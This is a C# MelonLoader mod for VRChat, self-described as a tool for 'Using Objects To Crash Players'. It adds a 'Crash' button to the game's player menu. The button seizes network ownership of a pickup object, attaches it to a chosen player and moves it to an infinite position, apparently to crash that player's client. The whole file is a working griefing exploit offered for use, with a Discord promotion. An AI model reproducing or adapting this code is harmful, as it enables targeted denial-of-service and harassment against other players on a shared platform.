using MelonLoader;
using System;
using System.Linq;
using UnityEngine;
using VRC;
using UnityEngine.UI;
using VRC.SDKBase;
using UnhollowerRuntimeLib;

namespace targetcrash{
    public class Class1:MelonMod{
        string objectcrashname;float delay;bool crashing;bool useauto=true;
        public override void OnUpdate(){
            if(crashing&&Time.time>delay){
                if(useauto){
                    var b=obj();
                    Networking.SetOwner(mee(),b);
                    b.transform.SetPositionAndRotation(new Vector3(b.transform.position.x,Vector3.positiveInfinity.y,b.transform.rotation.z),b.transform.rotation);
                    b.transform.parent=null;
                }
                else{
                    foreach(var b in Resources.FindObjectsOfTypeAll<VRC.SDKBase.VRC_Pickup>()){if(b.gameObject.name.ToLower().Contains(objectcrashname.ToLower())){
                        Networking.SetOwner(mee(),b.gameObject);
                        var p=b.transform.position;
                        b.gameObject.transform.SetPositionAndRotation(new Vector3(p.x,Vector3.positiveInfinity.y,p.z),b.transform.rotation);
                        b.transform.parent=null;
                    }}
                }
                crashing=false;
            }
        }
        public override void VRChat_OnUiManagerInit(){
            Console.WriteLine("Join discord.gg/PQjc7FT");
            Console.WriteLine("Using Objects To Crash Players 1.2 (this has been around for a very long time and anyone claiming to own this is a skid)");
            Console.WriteLine("Select A Player To Crash!!! ~<3 With Luv -Kat");
            var g=GameObject.Find("UserInterface/QuickMenu/UserInteractMenu/ReportAbuseButton").transform;
            var g1=GameObject.Find("UserInterface/QuickMenu/UserInteractMenu/WarnButton").transform;
            var g2=GameObject.Find("UserInterface/QuickMenu/UserInteractMenu/KickButton").transform;
            if(File.Exists("Mods/DayClientML2.dll")){g=g2;Console.WriteLine("Detected DayClientML2, Moving Button For Compatibility");}
            var x=GameObject.Instantiate(QuickMenu.prop_QuickMenu_0.transform.Find("CameraMenu/BackButton").gameObject,g.parent);
            x.transform.position=g1.position;
            x.GetComponentInChildren<Text>().text="Auto Object";
            x.GetComponentInChildren<UiTooltip>().text="Swap Between Known Object Names And Setting Your Own Custom Object Name";
            x.GetComponentInChildren<Text>().color=new Color(1,.8f,1);
            x.GetComponentInChildren<Image>().color=new Color(1,.8f,1);
            x.GetComponent<Button>().onClick=new Button.ButtonClickedEvent();
            x.GetComponent<Button>().onClick.AddListener(new Action(()=>{
                if(useauto){
                    x.GetComponentInChildren<Text>().text="Use Auto";
                    x.GetComponentInChildren<Text>().color=Color.cyan;
		            popup("What Would Be Part Of The Custom Object's Name?","Use",delegate(string a){
                        foreach(var b in Resources.FindObjectsOfTypeAll<VRC.SDKBase.VRC_Pickup>()){if(b.gameObject.name.ToLower().Contains(a.ToLower())){
                            objectcrashname=a;Console.WriteLine("Using: "+b.gameObject.name);
                        }}
		            });
                    useauto=false;
                }
                else{
                    x.GetComponentInChildren<Text>().text="Use Custom";
                    x.GetComponentInChildren<Text>().color=new Color(1,.8f,1);
                    useauto=true;
                }
            }));
            var x1=GameObject.Instantiate(QuickMenu.prop_QuickMenu_0.transform.Find("CameraMenu/BackButton").gameObject,g.parent);
            x1.transform.position=g.position;
            x1.GetComponentInChildren<Text>().text="Crash";
            x1.GetComponentInChildren<UiTooltip>().text="Clap That Kid";
            x1.GetComponentInChildren<Text>().color=new Color(1,.8f,1);
            x1.GetComponentInChildren<Image>().color=new Color(1,.8f,1);
            x1.GetComponent<Button>().onClick=new Button.ButtonClickedEvent();
            x1.GetComponent<Button>().onClick.AddListener(new Action(()=>{
                var t=PlayerManager.Method_Public_Static_Player_String_0(QuickMenu.prop_QuickMenu_0.prop_APIUser_0.id).field_Internal_VRCPlayer_0.gameObject.transform;
                if(useauto){
                    var b=obj();
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0,b);
                    b.GetComponent<Rigidbody>().isKinematic=true;
                    b.transform.SetPositionAndRotation(t.position,t.rotation);
                    b.transform.parent=t;
                }
                else{
                    foreach(var b in Resources.FindObjectsOfTypeAll<VRC.SDKBase.VRC_Pickup>()){if(b.gameObject.name.ToLower().Contains(objectcrashname.ToLower())){
                        Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0,b.gameObject);
                        b.GetComponent<Rigidbody>().isKinematic=true;
                        b.transform.SetPositionAndRotation(t.position,t.rotation);
                        b.transform.parent=t;
                    }}
                }
                crashing=true;delay=Time.time+1;
            }));
            var s=new Vector3(69,69,69);
            g.position+=s;
            g1.position+=s;
        }
        VRCPlayerApi mee(){return VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0;}
        GameObject obj(){
            var k=(from b in Resources.FindObjectsOfTypeAll<VRC.SDKBase.VRC_Pickup>()
            where b.gameObject.active&&(b.gameObject.name.Contains("Marker (2)")||b.gameObject.name.Contains("Devil Bucket")||b.gameObject.name.Contains("hicken (1)")||b.gameObject.name.Contains("ylinder.242"))
            select b).First().gameObject;
            if(k!=null){return k;}
            else{return
                (from b in Resources.FindObjectsOfTypeAll<VRC.SDKBase.VRC_Pickup>()
                where b.gameObject.active&&(b.GetComponent<BoxCollider>()||b.GetComponent<SphereCollider>()||b.GetComponent<CapsuleCollider>()||b.GetComponent<MeshCollider>())
                select b).First().gameObject;
            }
            return null;
        }
        void cobj(GameObject g){
        }
        void popup(string title,string text,System.Action<string> okaction){
            VRCUiPopupManager.field_Private_Static_VRCUiPopupManager_0.Method_Public_Void_String_String_InputType_Boolean_String_Action_3_String_List_1_KeyCode_Text_Action_String_Boolean_Action_1_VRCUiPopup_PDM_0(title,"",InputField.InputType.Standard,false,text,
            DelegateSupport.ConvertDelegate<Il2CppSystem.Action<string,Il2CppSystem.Collections.Generic.List<KeyCode>,Text>>
            (new Action<string,Il2CppSystem.Collections.Generic.List<KeyCode>,Text>
            (delegate(string s,Il2CppSystem.Collections.Generic.List<KeyCode> k,Text t){
                okaction(s);
            })),null,"...",true,null);
        }
    }
}
